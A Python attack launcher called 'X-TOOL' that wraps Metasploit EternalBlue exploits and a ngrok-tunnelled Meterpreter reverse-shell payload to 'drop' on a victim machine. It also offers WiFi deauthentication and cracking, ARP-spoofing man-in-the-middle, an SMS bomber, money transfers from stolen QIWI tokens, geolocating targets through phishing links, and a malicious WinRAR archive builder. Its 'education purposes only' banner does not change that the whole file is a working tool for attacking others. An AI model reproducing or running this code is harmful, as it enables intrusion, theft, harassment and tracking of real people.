#-- coding: utf8 --
#!/usr/bin/env python3
import os, time
logo = '''
            __  __          _____ ___   ___  _     
            \ \/ /         |_   _/ _ \ / _ \| |    
             \  /   _____    | || | | | | | | |    
             /  \  |_____|   | || |_| | |_| | |___ 
            /_/\_\           |_| \___/ \___/|_____|
            ######################################
            # Use it for EDUCATION PURPOSES only #                        
            ######################################

						Author: XERSIX

'''
print(logo)
Interface = input('[*]Write Name of your Internet Access Interface, (Example: wlan0):')
print('')
print('[*]Make sure for you installed this programs!')       #Programs and Tools must be installed.
print('[*]Metasploit Framework')
print('[*]Aircrack-ng')
print('[*]Ngrok')
print('[*]postgresql')
print('[*]Wifite')
print('[*]This exploit/windows/smb/ms17_010_psexec, You must download this from network and copy file in Metasploit folder/smb')
print('')
print('')
print('[*] X-TOOL Exploits:')
print('[1] Eternal Blue')
print('[2] Eternal Blue Win10')
print('[3] Deauth WiFi network')                                             #Exploits
print('[4] Windows Meterpreter Over Wan')
print("[5] Android Meterpeter Over Wan")
print('[6] MITM Attack (Man in the middle Attack) (Using MITMf) (PC only)')
print('[7] Crack Wifi network password!')
print('[8] SMS BOMBER')
print('[9] QIWI Check Balance using token')
print('[10] QIWI Transfer money using token')
print("[11] Check Location and information from link (seeker)(Blocked in Russia)")
print("[12] Check Location and info from link (locator)(Working in Russia)")
print("[13] Evil Winrar CVE")
print('')
query = input("[*] Choose exploit!:")
if query in ["1"]:
	print('Check and remember Victim IP!')
	print('CTRL + C to Stop Scaning!')
	time.sleep(3)
	Ipcheck = ('netdiscover -i ') + (Interface)
	os.system(Ipcheck)
	Victim = input('[*]Write Victim IP!:')
	print('Check and remember your local IP!:')
	time.sleep(3)
	Ipcheck2 = ('ifconfig ') + (Interface)
	os.system(Ipcheck2)
	Local = input('[*]Write your Local IP address!:')	
	EternalBlue = ('msfconsole  -q -x "use exploit/windows/smb/ms17_010_eternalblue; set rhost ') + (Victim) + ('; set lhost ') + (Local) + ('; set payload windows/x64/meterpreter/reverse_tcp; exploit"')
	os.system(EternalBlue)
if query in ["2"]:
	print('')
	print('Check and remember Victim IP!')
	print('CTRL + C to Stop Scaning!')
	time.sleep(5)
	Ipcheck = ('netdiscover -i ') + (Interface)
	os.system(Ipcheck)
	Victim2 = input('[*]Write Victim IP!:')
	User = input('Write Target Username!:')
	Pass = input('Write Target Password!:')
	EternalBlueWin10 = ('msfconsole  -q -x "use exploit/windows/smb/ms17_010_psexec; set rhost ') + (Victim2) + ('; set SMBUser ') + (User) + ('; set SMBPass ') + (Pass) + (';exploit"')
	os.system(EternalBlueWin10)
if query in ["3"]:
	print('')
	print('Check and remember bssid and Channel of Target network!')
	print('CTRL + C to stop Scan!')
	time.sleep(5)
	WifiDump = ('airodump-ng ') + (Interface)
	os.system(WifiDump)
	WifiChannel = input('Write Channel of Target Network!:')
	bssid = input('Write bssid of Target Network!:')
	iwconfig = ('iwconfig') + (' ') + (Interface) + (' ') + ('channel') + (' ') + (WifiChannel)
	os.system(iwconfig)
	aireplay = ('aireplay-ng -0 0 -a ') + (bssid) + (' ') + (Interface)
	os.system(aireplay)
if query in ["4"]:
	print('')
	print('Open another terminal and start Ngrok with tcp port 4444 (ngrok tcp 4444)')
	NgrokPort = input('Write Ngrok Port!:')
	PayloadFile = input('What name of file you want? (Dont forget to write .exe):')
	msfvenom = ('cd && msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=0.tcp.ngrok.io LPORT=') + (NgrokPort) + (' -b "\\x00" -e x86/shikata_ga_nai -f exe -o') + (PayloadFile)
	os.system(msfvenom)
	print('Payload File locate on your home directory! Drop this to Victim Machine!')
	postgresql = ('service postgresql start')
	os.system(postgresql)
	msfMeter = ('msfconsole  -q -x "set payload windows/meterpreter/reverse_tcp; set lhost 0.0.0.0; set LPORT 4444; use multi/handler; exploit"')
	os.system(msfMeter)
if query in ["5"]:
	print('')
	print('Open another terminal and start Ngrok with tcp port 4444 (ngrok tcp 4444)')
	NgrokPort = input('Write Ngrok Port!:')
	PayloadFile = input('What name of file you want? (Dont forget to write .apk):')
	msfvenom = ('cd && msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=0.tcp.ngrok.io LPORT=') + (NgrokPort) + (' -b "\\x00" -e x86/shikata_ga_nai -f exe -o') + (PayloadFile)
	os.system(msfvenom)
	print('Payload File locate on your home directory Drop this to Victim Phone!')
	postgresql = ('service postgresql start')
	os.system(postgresql)
	msfMeter = ('msfconsole  -q -x "set payload windows/meterpreter/reverse_tcp; set lhost 0.0.0.0; set LPORT 4444; use multi/handler; exploit"')
	os.system(msfMeter)


if query in ["6"]:
	print('')
	print('Check and remember gateway IP!')
	os.system('netstat -rn')
	time.sleep(3)
	RouterIP = input('Enter Gateway IP!:')
	MITM = ('cd MITMf && python mitmf.py -i ') + (Interface) + (' --spoof --arp --gateway ') + (RouterIP) + (' --upsidedownternet')
	os.system(MITM)
if query in ["7"]:
	print('You must put your dict in X-TOOL folder!')
	dictionary = input('Enter name of dictionary file!:')
	Cracking = ('wifite --dict ') + (dictionary)
	os.system(Cracking)
if query in ["8"]:
	print("Welcome to SMS Mailer!")
	print("Spoofer was writen by TheSpeedX")
	time.sleep(5)
	os.system("cd && cd X-TOOL && cd TBomb/ && chmod +x * && ./TBomb.sh")
	print("Messages Sended!")
if query in ["9"]:
	os.system('cd && cd X-TOOL && python3 QiwiBalance.py')
if query in ["10"]:
	os.system('cd && cd X-TOOL && python3 QiwiBablo.py')

if query in ["11"]:
	print("Starting Seeker!")
	print("Start Ngrok in another Terminal(ngrok http 8080)")
	os.system("cd && cd X-TOOL && cd seeker && python3 seeker.py -t manual")
if query in ["12"]:
	print("Use 01")
	print("Open Another Terminal and start Ngrok (ngrok http 55333)")
	print("Send Link from Ngrok Terminal to target")
	time.sleep(5)	
	os.system("cd && cd X-TOOL && cd locator && bash locator.sh")
if query in ["13"]:
	Evil_file = input("Enter File name of virus file you want in rar archive(Put file in X-Tool folder (/home/X-TOOL)!:")
	Good_files = input("Enter File Names of Good files (Example: world.txt hello.txt)(Put their in to X-Tool folder(/home/X-TOOL")


	CVE = ("cd && cd X-TOOL && ./evilWinRAR.py -e ") + (Evil_file) + (" -g ") + (Good_files)
	os.system(CVE)
else:
	print('')
	print('[X] Sorry, You didnt choose options!')
